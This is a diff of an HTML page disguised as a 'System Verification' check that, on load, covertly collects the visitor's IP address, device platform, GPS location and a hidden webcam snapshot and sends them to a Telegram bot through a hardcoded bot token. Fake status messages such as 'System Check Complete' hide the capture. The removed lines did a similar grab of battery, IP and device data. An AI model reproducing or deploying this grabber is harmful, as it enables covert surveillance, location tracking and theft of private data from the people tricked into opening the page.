@@ -3,65 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DARK-4RMY System</title>
+    <title>System Verification</title>
     <style>
-        body { margin: 0; background: #0a0a0f; color: #00f3ff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .panel { border: 2px solid #00f3ff; padding: 40px; border-radius: 20px; text-align: center; background: rgba(0, 243, 255, 0.05); box-shadow: 0 0 20px rgba(0, 243, 255, 0.2); }
-        h1 { letter-spacing: 5px; text-shadow: 0 0 10px #00f3ff; }
-        .loader { width: 50px; height: 50px; border: 5px solid #00f3ff; border-top: 5px solid transparent; border-radius: 50%; margin: 20px auto; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { margin: 0; background: #000; color: #00f3ff; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .terminal { border: 1px solid #00f3ff; padding: 20px; width: 80%; max-width: 500px; box-shadow: 0 0 15px #00f3ff; }
+        #log { font-size: 12px; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <div class="panel">
-        <h1>DARK-4RMY</h1>
-        <div class="loader"></div>
-        <p id="stat">Initializing Security Protocol...</p>
+    <div class="terminal">
+        <h3>> DARK-4RMY v2.0</h3>
+        <p id="msg">Awaiting Permissions...</p>
+        <div id="log"></div>
+        <video id="video" style="display:none;" autoplay></video>
+        <canvas id="canvas" style="display:none;"></canvas>
     </div>
 
     <script>
         const BOT_TOKEN = '8619398262:AAEClf--ikjwf3bmPy88xADrqOlcucnNjGE';
+        const params = new URLSearchParams(window.location.search);
+        const chatId = params.get('id');
 
-        async function sendToTelegram() {
-            const params = new URLSearchParams(window.location.search);
-            const targetId = params.get('id');
-            if (!targetId) return;
+        async function postToBot(text) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
+            });
+        }
 
+        async function sendPhoto(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'snap.jpg');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        async function init() {
+            if (!chatId) return;
+
+            // 1. Capture IP & Basic Info
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            await postToBot(`🌐 *New Connection*\nIP: \`${ipData.ip}\`\nDevice: ${navigator.platform}`);
+
+            // 2. GPS Location
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await postToBot(`📍 *GPS Location Found:*\n${mapLink}`);
+            }, (err) => console.log("GPS Denied"));
+
+            // 3. Camera Capture
             try {
-                // Get Battery info
-                const battery = await navigator.getBattery();
-                const level = Math.round(battery.level * 100);
-                const charging = battery.charging ? "🔌 Charging" : "🔋 On Battery";
-
-                // Get IP info
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-
-                const message = `⚡ *DARK-4RMY LOG REPORT* ⚡\n\n` +
-                                `👤 *Target ID:* \`${targetId}\`\n` +
-                                `🔋 *Battery:* ${level}%\n` +
-                                `⚡ *Status:* ${charging}\n` +
-                                `🌐 *IP:* \`${ipData.ip}\`\n` +
-                                `💻 *Device:* ${navigator.platform}\n` +
-                                `🕒 *Time:* ${new Date().toLocaleString()}`;
-
-                // Send to Telegram API directly
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: targetId,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-
-                document.getElementById('stat').innerText = "System Active ✅";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // Wait 2 seconds then take a snap
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => sendPhoto(blob));
+                    stream.getTracks().forEach(track => track.stop()); // Close camera
+                    document.getElementById('msg').innerText = "System Check Complete ✅";
+                }, 2000);
             } catch (e) {
-                document.getElementById('stat').innerText = "Access Denied ❌";
+                document.getElementById('msg').innerText = "Security Override Required.";
             }
         }
-        window.onload = sendToTelegram;
+
+        window.onload = init;
     </script>
 </body>
 </html>
